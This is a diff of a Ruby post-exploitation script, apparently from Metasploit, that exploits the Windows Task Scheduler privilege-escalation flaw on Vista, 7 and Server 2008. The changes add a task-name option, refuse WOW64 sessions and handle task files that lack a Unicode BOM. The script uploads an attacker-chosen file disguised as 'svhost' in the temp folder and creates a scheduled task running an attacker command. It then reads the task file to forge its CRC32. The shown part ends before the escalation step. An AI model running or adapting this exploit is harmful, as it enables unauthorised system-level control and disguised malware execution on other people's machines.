@@ -1,5 +1,5 @@
 ##
-# $Id: $
+# $Id$
 ##
 
 ##
@@ -17,22 +17,27 @@ require 'zlib'
 #
 # Filter out sessions that this definitely won't work on.
 #
-if session.platform =~ /win32|win64/
-	vuln = false
-	winver = session.sys.config.sysinfo["OS"]
-	affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
-	affected.each { |v|
-		if winver.include? v
-			vuln = true
-			break
-		end
-	}
-	if not vuln
-		print_error("#{winver} is not vulnerable.")
-		raise Rex::Script::Completed
-	end
-else
+if session.platform !~ /win32|win64/
 	print_error("#{session.platform} is not supported.")
+	raise Rex::Script::Completed
+end
+
+if session.sys.config.sysinfo["Architecture"] =~ /wow64/i
+	print_error("Running against via WOW64 is not supported, try using an x64 meterpreter...")
+	raise Rex::Script::Completed
+end
+
+vuln = false
+winver = session.sys.config.sysinfo["OS"]
+affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
+affected.each { |v|
+	if winver.include? v
+		vuln = true
+		break
+	end
+}
+if not vuln
+	print_error("#{winver} is not vulnerable.")
 	raise Rex::Script::Completed
 end
 
@@ -43,7 +48,8 @@ end
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-c" => [ true, "Execute the specified command" ],
-	"-u" => [ true, "Upload and execute the specified file" ]
+	"-u" => [ true, "Upload and execute the specified file" ],
+	"-t" => [ true, "Use the specified task name" ],
 )
 
 def usage
@@ -66,6 +72,9 @@ upload_fn = nil
 			raise "Specified file to upload does not exist!"
 		end
 
+	when "-t"
+		taskname = val
+
 	when "-h"
 		usage
 
@@ -73,7 +82,11 @@ upload_fn = nil
 }
 
 # Must have at least one of -c or -u
-usage if not cmd and not upload_fn
+if not cmd and not upload_fn
+	print_error("You must specify -c or -s")
+	print_line('')
+	usage
+end
 
 if cmd
 	print_status("Using command: #{cmd}")
@@ -82,19 +95,21 @@ end
 #
 # Upload the payload command if needed
 #
+sysdir = session.fs.file.expand_path("%SystemRoot%")
+tmpdir = session.fs.file.expand_path("%TEMP%")
 if upload_fn
-	location = session.fs.file.expand_path("%TEMP%")
 	begin
+		location = tmpdir.dup
 		ext = upload_fn.split('.')
 		if ext
 			ext = ext.last.downcase
 			if ext == "exe"
-				location = "#{location}\\svhost#{rand(100)}.exe"
+				location << "\\svhost#{rand(100)}.exe"
 			else
-				location = "#{location}\\TMP#{rand(100)}#{ext}"
+				location << "\\TMP#{rand(100)}#{ext}"
 			end
 		else
-			location = "#{location}\\TMP#{rand(100)}"
+			location << "\\TMP#{rand(100)}"
 		end
 
 		print_status("Uploading #{upload_fn} to #{location}....")
@@ -113,8 +128,10 @@ end
 # CRC32 stuff from ESET (presumably reversed from Stuxnet, which was presumably
 # reversed from Microsoft's code)
 #
+if not self.class.const_defined? 'ESET'
+
 class ESET
-	BWD_Table ||= [
+	BWD_Table = [
 		0x00000000, 0xDB710641, 0x6D930AC3, 0xB6E20C82,
 		0xDB261586, 0x005713C7, 0xB6B51F45, 0x6DC41904,
 		0x6D3D2D4D, 0xB64C2B0C, 0x00AE278E, 0xDBDF21CF,
@@ -201,6 +218,8 @@ class ESET
 	end
 end
 
+end
+
 
 def exec_schtasks(cmdline, purpose)
 	lns = cmd_exec(cmdline)
@@ -210,13 +229,31 @@ def exec_schtasks(cmdline, purpose)
 	if lns !~ /SUCCESS:/
 		raise "Unable to #{purpose}!"
 	end
+	lns
+end
+
+
+def read_task_file(taskname, taskfile)
+	print_status("Reading the task file contents from #{taskfile}...")
+
+	# Can't read the file directly on 2008?
+	content = ''
+	fd = client.fs.file.new(taskfile, "rb")
+	until fd.eof?
+		content << fd.read
+	end
+	fd.close
+
+	content
 end
 
 
 #
 # Create a new task to do our bidding, but make sure it doesn't run.
 #
-taskname = Rex::Text.rand_text_alphanumeric(8+rand(8))
+taskname ||= Rex::Text.rand_text_alphanumeric(8+rand(8))
+taskfile = "#{sysdir}\\system32\\tasks\\#{taskname}"
+
 print_status("Creating task: #{taskname}")
 cmdline = "schtasks.exe /create /tn #{taskname} /tr \"#{cmd}\" /sc monthly /f"
 exec_schtasks(cmdline, "create the task")
@@ -224,29 +261,23 @@ exec_schtasks(cmdline, "create the task")
 #
 # Read the contents of the newly creates task file
 #
-sysdir = session.fs.file.expand_path("%SystemRoot%")
-taskfile = "#{sysdir}/system32/tasks/#{taskname}"
-print_status("Reading the task file contents from #{taskfile}...")
-
-content = ''
-fd = client.fs.file.new(taskfile, "rb")
-until fd.eof?
-	content << fd.read
-end
-fd.close
+content = read_task_file(taskname, taskfile)
 
 #
 # Double-check that we got what we expect.
 #
 if content[0,2] != "\xff\xfe"
-	print_status("Ack! The content does not begin with a Unicode BOM! Aborting..")
-	raise Rex::Script::Completed
+	#
+	# Convert to unicode, since it isn't already
+	#
+	content = content.unpack('C*').pack('v*')
+else
+	#
+	# NOTE: we strip the BOM here to exclude it from the crc32 calculation
+	#
+	content = content[2,content.length]
 end
 
-#
-# NOTE: we purposefully exclude the BOM from the crc32 calculation
-#
-content = content[2,content.length]
 
 #
 # Record the crc32 for later calculations
